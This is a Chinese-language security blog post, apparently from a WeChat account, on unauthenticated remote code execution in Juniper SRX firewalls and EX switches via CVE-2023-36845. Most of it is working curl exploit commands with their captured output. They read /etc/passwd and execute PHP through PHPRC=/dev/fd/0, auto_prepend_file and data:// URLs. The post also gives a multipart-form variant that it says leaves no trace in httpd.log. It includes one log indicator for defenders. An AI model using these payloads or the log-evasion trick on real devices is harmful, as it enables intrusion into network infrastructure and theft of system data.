#  Juniper防火墙RCE

原创 安全路人A [ 军机故阁 ](javascript:void\(0\);)

**军机故阁** ![]()

微信号 gh_e57baf46bdf5

功能介绍 最新的安全情报与技术

____

___发表于_

收录于合集

祝大家国庆快乐，这个近期热点漏洞，导致RCE源于两个中危漏洞组合，测试发现了更多情况。

原watchTowr博文地址如下：https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-
juniper-firewalls/，两个中危漏洞为CVE-2023-36846，被描述为关键功能的身份验证缺失漏洞，而CVE-2023-36845是一个
PHP 环境变量操纵漏洞。影响 Juniper SRX防火墙和EX交换机。Juniper将这两个漏洞评为中危问题（5.3分），原博文中组合利用两个漏洞可以

但我测试发现仅利用CVE-2023-36845。即可实现远程、未经身份验证的代码执行。

原文攻击链第一步使用CVE-2023-36846调用J-Web界面中的do_fileUpload函数。这将导致将任意文件写入/var/tmp，poc如下：

  * 

    
    
    $ curl http://10.12.72.1/webauth_operation.php -d 'rs=do_upload&rsargs[]=[{"fileName": "test.php", "fileData": ",PD9waHAgDQpwaHBpbmZvKCk7DQo/Pg==", "csize": 22}]

 ** **但测试下来有一种根本不需要文件上传的新RCE路径和信息泄露思路。**** **信息泄露漏洞思路和POC**

watchTowr团队的攻击通过上传两个文件，将PHPRC环境变量设置为其中一个文件，然后使用php.ini
auto_prepend_file设置强制每个php页面加载第二个文件来实现代码执行。这是一个非常好的攻击思路，但如果你不能上传文件的环境呢，还有一条路，使用stdin。

Juniper防火墙使用Appweb
web服务器。当Appweb调用CGI脚本时，它会传递各种环境变量和参数，以便脚本可以访问用户的HTTP请求。HTTP请求的主体通过stdin传递。受影响的防火墙运行FreeBSD，每个FreeBSD进程都可以通过打开/dev/fd/0访问其stdin。通过发送HTTP请求，我们可以向系统引入一个“文件”/dev/fd/0。

使用这个技巧，可以将PHPRC环境变量设置为/dev/fd/0，并在HTTP请求中包含所需的php.ini。下面的curl请求演示了这种攻击，可以为每个响应包前触发显示/etc/passwd。

POC：

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    $ curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'root:*:0:0:Charlie &:/root:/bin/cshdaemon:*:1:1:Owner of many system processes:/root:/sbin/nologinoperator:*:2:5:System &:/:/sbin/nologinbin:*:3:7:Binaries Commands and Source:/:/sbin/nologintty:*:4:65533:Tty Sandbox:/:/sbin/nologinkmem:*:5:65533:KMem Sandbox:/:/sbin/nologingames:*:7:13:Games pseudo-user:/usr/games:/sbin/nologinman:*:9:9:Mister Man Pages:/usr/share/man:/sbin/nologinsshd:*:22:22:Secure Shell Daemon:/var/empty:/sbin/nologinext:*:39:39:External applications:/:/sbin/nologinbind:*:53:53:Bind Sandbox:/:/sbin/nologinuucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/sbin/nologinnobody:*:65534:65534:Unprivileged user:/nonexistent:/sbin/nologin<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html>  <head>    <meta http-equiv="Content-Type" content="text/html"/>    <link rel="stylesheet" href="/stylesheet/juniper.css" type="text/css"/>    <title>Log In - Juniper Web Device Manager</title>    <link rel="shortcut icon" href='images/favicon.ico' type="image/x-icon"/>  
      </head>  
    

这是一次巧妙的信息泄漏，但它不是RCE，还有另一种信息泄露手法，也类似。

原博文中为了实现代码执行，watchTowr 使用了两个文件。一种用于php.ini，另一种用于任意 PHP。我测试发现了新方法。

 **RCE的思路和POC**

##  PHP 的一个功能，auto_prepend_file，很简单。使用该函数添加提供的文件require。来自php.net的描述：

> auto_prepend_file string Specifies the name of a file that is automatically
> parsed before the main file. The file is included as if it was called with
> the require function, so include_path is used。

对于我们的攻击要求，另一个PHP功能与auto_prepend_file很好地配合。该功能为allow_url_include：

> allow_url_include bool 此选项允许使用具有以下函数的 URL 感知 fopen
> 包装器：include、include_once、require、require_once。

通过启用allow_url_include，我们可以使用任何带有auto_prepend_file的协议包装器。显而易见的选择是 data://
以内联方式提供“第二个文件”形式。以下是执行<?phpinfo();?> 的POC：

    
          *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 
    
    
    
    $ curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd"><html><head><style type="text/css">body {background-color: #ffffff; color: #000000;}body, td, th, h1, h2 {font-family: sans-serif;}pre {margin: 0px; font-family: monospace;}a:link {color: #000099; text-decoration: none; background-color: #ffffff;}a:hover {text-decoration: underline;}table {border-collapse: collapse;}.center {text-align: center;}.center table { margin-left: auto; margin-right: auto; text-align: left;}.center th { text-align: center !important; }td, th { border: 1px solid #000000; font-size: 75%; vertical-align: baseline;}h1 {font-size: 150%;}h2 {font-size: 125%;}.p {text-align: left;}.e {background-color: #ccccff; font-weight: bold; color: #000000;}.h {background-color: #9999cc; font-weight: bold; color: #000000;}.v {background-color: #cccccc; color: #000000;}.vr {background-color: #cccccc; text-align: right; color: #000000;}img {float: right; border: 0px;}hr {width: 600px; background-color: #cccccc; border: 0px; height: 1px; color: #000000;}</style><title>phpinfo()</title><meta name="ROBOTS" content="NOINDEX,NOFOLLOW,NOARCHIVE" /></head><body><div class="center">

`

就像这样，通过仅使用CVE-2023-36845，我们实现了未经验证的远程代码执行，而无需在磁盘上实际放置文件。利用一个漏洞建立了一个反向shell。

另在shodan上简单搜索了下，大约 15,000 个具有面向互联网的 Web 界面的 Juniper
设备，而且大量是未打补丁的状态，不过也有相当多是蜜罐：

![]()

 **还有个小技巧：**

防火墙是 APT 常见的目标，因为它们有助于桥接受保护的网络，并可以充当 C2
基础设施的有用主机。如果拥有未打补丁的Juniper网络防火墙的站点，都应该检查是否有被入侵的痕迹。httpd.log会包含以下payload部分：

> httpd:2:POST /?PHPRC=/dev/fd/0 HTTP/1.1

但是，攻击者可以绕过在 HTTP
标头中包含变量，只是为了方便测试和展示才这么写的poc，真实情况中，可以使用多部分表单数据，当攻击者使用这种形式的攻击时，httpd.log（以及据我们所知的所有其他日志）基本上是无感知的。

    
          *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 
    
    
    
    $ curl "http://10.12.72.1/" -F $'auto_prepend_file="/etc/passwd\n"' -F 'PHPRC=/dev/fd/0'root:*:0:0:Charlie &:/root:/bin/cshdaemon:*:1:1:Owner of many system processes:/root:/sbin/nologinoperator:*:2:5:System &:/:/sbin/nologinbin:*:3:7:Binaries Commands and Source:/:/sbin/nologintty:*:4:65533:Tty Sandbox:/:/sbin/nologinkmem:*:5:65533:KMem Sandbox:/:/sbin/nologingames:*:7:13:Games pseudo-user:/usr/games:/sbin/nologinman:*:9:9:Mister Man Pages:/usr/share/man:/sbin/nologinsshd:*:22:22:Secure Shell Daemon:/var/empty:/sbin/nologinext:*:39:39:External applications:/:/sbin/nologinbind:*:53:53:Bind Sandbox:/:/sbin/nologinuucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/sbin/nologinnobody:*:65534:65534:Unprivileged user:/nonexistent:/sbin/nologin<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html>  <head>    <meta http-equiv="Content-Type" content="text/html"/>    <link rel="stylesheet" href="/stylesheet/juniper.css" type="text/css"/>    <title>Log In - Juniper Web Device Manager</title>    <link rel="shortcut icon" href='images/favicon.ico' type="image/x-icon"/>  </head>

`

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

